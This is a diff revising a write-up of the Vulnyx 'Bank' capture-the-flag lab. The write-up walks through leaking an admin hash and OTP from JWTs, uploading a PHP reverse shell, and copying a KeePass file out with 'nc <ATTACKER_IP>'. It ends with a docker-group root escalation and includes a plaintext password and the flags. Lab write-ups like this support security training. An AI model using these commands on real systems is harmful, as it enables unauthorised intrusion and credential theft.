@@ -5,18 +5,18 @@
 | **Platform** | Vulnyx |
 | **OS** | Linux |
 | **Difficulty** | Easy |
-| **Creator** | Alherrero |
+| **Creator** | `Alherrero` |
 | **Tools used** | `nmap` · `smbmap` · `smbclient` · `john` · `BurpSuite` · `nc` · `keepassxc` · `docker` |
 | **Tags** | `#SMB` `#JWT` `#InfoDisclosure` `#FileUpload` `#RCE` `#CredentialReuse` `#DockerAbuse` |
-| **URL** | `https://vulnyx.com/machines/` |
+| **URL** | https://vulnyx.com/machines/ |
 
 An SMB share leaks the path to a hidden development instance of a banking web app. A money-transfer feature meant to verify a recipient's username instead returns their full user object — including a bcrypt password hash — inside a JWT, and a failed OTP attempt does the same with the real one-time code. Those two leaks are enough to log in as `admin` and abuse a profile avatar upload to get a PHP web shell. From there, a KeePass database recovered from the filesystem yields SSH credentials for `marcelo`, and membership in the `docker` group provides a straightforward path to root.
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open -n -vvv -Pn bank.nyx
@@ -28,7 +28,7 @@ PORT    STATE SERVICE      REASON
 MAC Address: 08:00:27:C2:B4:77 (Oracle VirtualBox virtual NIC)
 ```
 
-A version/script scan against the open ports fills in the details:
+A version and script scan on the open ports fills in the details:
 
 ```bash
 $ sudo nmap -p 80,139,445 -sCV bank.nyx
@@ -60,6 +60,7 @@ The main page:
 ```
 http://bank.nyx/
 ```
+
 <img src="../Images/bank/Pasted image 20260522165318.png"/>
 
 ### SMB Enumeration
@@ -82,7 +83,7 @@ $ smbmap -H bank.nyx
 [*] Closed 1 connections
 ```
 
-A `development` share stands out. It's accessible without credentials:
+A `development` share stands out, readable without credentials:
 
 ```bash
 $ smbclient -N //bank.nyx/development
@@ -130,8 +131,7 @@ http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/
 
 <img src="../Images/bank/Pasted image 20260522165439.png"/>
 
-
-A new account is registered — `hacker` — to get an authenticated session and access the rest of the app's functionality. The registration itself is a simple signup form; the goal is just to verify how the application behaves as a logged-in user. Once inside, the app's own functionality is what exposes the existence of other accounts — including `admin` — which becomes the actual target for privilege escalation.
+A new account — `hacker` — is registered through the signup form, just to get an authenticated session and see how the app behaves once logged in.
 
 The app looks like a simple banking dashboard, with functionality to register accounts and send money between users:
 
@@ -147,7 +147,7 @@ The dashboard exposes a user enumeration issue — usernames of other accounts a
 
 ### Leaking the Admin Hash
 
-The money-transfer form includes a `verify_recipient` field, presumably meant to check that a username exists before a transfer goes through. The request sending an empty transfer with `to_username=admin` is captured:
+The money-transfer form includes a `verify_recipient` field, presumably meant to check that a username exists before a transfer goes through. Capturing the request that sends an empty transfer with `to_username=admin`:
 
 ```http
 POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard HTTP/1.1
@@ -173,6 +173,7 @@ The response includes a new JWT. Decoded, its payload is:
   "created_at": "2026-05-02 13:24:13"
 }
 ```
+
 <img src="../Images/bank/Pasted image 20260522165631.png"/>
 
 Instead of returning a simple "recipient exists" flag, the endpoint embeds the recipient's entire database row — password hash included — inside the token. This is an IDOR-flavored information disclosure: the check itself is legitimate, but the data returned to satisfy it goes far beyond what the feature needs.
@@ -181,7 +182,7 @@ Instead of returning a simple "recipient exists" flag, the endpoint embeds the r
 
 ### Cracking the Hash
 
-The hash is bcrypt, identifiable by the `$2y$` prefix, and gets run against `rockyou.txt`:
+The hash is bcrypt, identifiable by the `$2y$` prefix, and goes against `rockyou.txt`:
 
 ```bash
 $ john password_admin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
@@ -228,6 +229,7 @@ The response JWT decodes to:
   "otp_verified": false
 }
 ```
+
 <img src="../Images/bank/Pasted image 20260522165836.png"/>
 
 The real OTP is sitting in plaintext inside the token issued after the failed attempt — no need to guess or brute-force it.
@@ -239,6 +241,7 @@ Submitting that code completes the login:
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/admin.php
 ```
+
 <img src="../Images/bank/Pasted image 20260522164129.png"/>
 
 ### Avatar Upload → RCE
@@ -248,6 +251,7 @@ The profile page allows uploading an avatar image:
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=profile
 ```
+
 <img src="../Images/bank/Pasted image 20260522164143.png"/>
 
 A PHP reverse shell is uploaded directly with a `.php` extension, without touching the content type. The endpoint doesn't validate the file extension at all:
@@ -265,6 +269,7 @@ Content-Type: image/png
 <?php
 // php-reverse-shell payload
 ```
+
 <img src="../Images/bank/Pasted image 20260522170058.png"/>
 
 The upload lands in a predictable directory:
@@ -272,9 +277,10 @@ The upload lands in a predictable directory:
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
 ```
+
 <img src="../Images/bank/Pasted image 20260522164258.png"/>
 
-A listener is set up, and the uploaded file is requested to trigger the callback:
+A listener waits, and requesting the uploaded file triggers the callback:
 
 ```bash
 $ nc -nlvp <PORT>
@@ -290,7 +296,7 @@ www-data@bank:/$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -327,7 +333,7 @@ www-data@bank:/$ cd /srv/smb/passwords/
 
 > **Password:** `@zm{2h8aUu'a_M;'Jd:!MAQ?zn`
 
-Along with (or near) that note, a KeePass database file (`passwords.kdbx`) is found on the box and exfiltrated over a raw `nc` transfer — one side listens on the attacker's machine and redirects the incoming stream to a file, the other sends the file into a connection to that listener:
+The note sits right next to `passwords.kdbx`, and despite Juan's assurance the directory is world-readable (`drwxrwxrwx`), so `www-data` can read both. The database comes off the box over a raw `nc` transfer — one side listens on the attacker's machine and redirects the incoming stream to a file, the other sends the file into a connection to that listener:
 
 ```bash
 # Attacker Machine
@@ -337,11 +343,12 @@ $ nc -lvp <PORT> > passwords.kdbx
 nc <ATTACKER_IP> <PORT> < passwords.kdbx
 ```
 
-With the database local, `keepassxc` opens it using the password recovered from `note.txt` as the master password:
+With the database local, `keepassxc` opens it using the password from `note.txt` as the master key:
 
 ```bash
 $ keepassxc
 ```
+
 <img src="../Images/bank/Pasted image 20260522164856.png"/>
 
 The vault holds a set of SSH credentials:
@@ -360,8 +367,9 @@ total 4
 -rw-rw-r-- 1 marcelo marcelo 33 May  3 07:02 user.txt
 marcelo@bank:/$ cat /home/marcelo/user.txt
 52728f2b72b6a153a415d8b738450fa3
-marcelo@bank:/$
 ```
+
+That `id` already shows the way to root: `marcelo` is in the `docker` group (`105(docker)`).
 
 > **User flag:** `52728f2b72b6a153a415d8b738450fa3`
 
@@ -374,7 +382,7 @@ marcelo@bank:/$ docker ps
 CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
 ```
 
-`marcelo` has access to the Docker daemon — visible above in the `id` output (`105(docker)`). That alone is equivalent to root on the host: a container started from an image like `alpine` runs as root inside its own namespace by default, and mounting the host's root filesystem into the container makes it directly writable from a root-owned process. `chroot`-ing into that mount then treats the host filesystem as the container's own root:
+Access to the Docker daemon is equivalent to root on the host. A container started from an image like `alpine` runs as root inside its own namespace by default, and mounting the host's root filesystem into the container makes it directly writable from a root-owned process. `chroot`-ing into that mount then treats the host filesystem as the container's own root:
 
 ```bash
 marcelo@bank:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
@@ -383,11 +391,6 @@ latest: Pulling from library/alpine
 6a0ac1617861: Pull complete
 Digest: sha256:5b10f432ef3da1b8d4c7eb6c487f2f5a8f096bc91145e68878dd4a5019afde11
 Status: Downloaded newer image for alpine:latest
-# id
-uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
-```
-
-```bash
 # id
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
 # ls -l /root
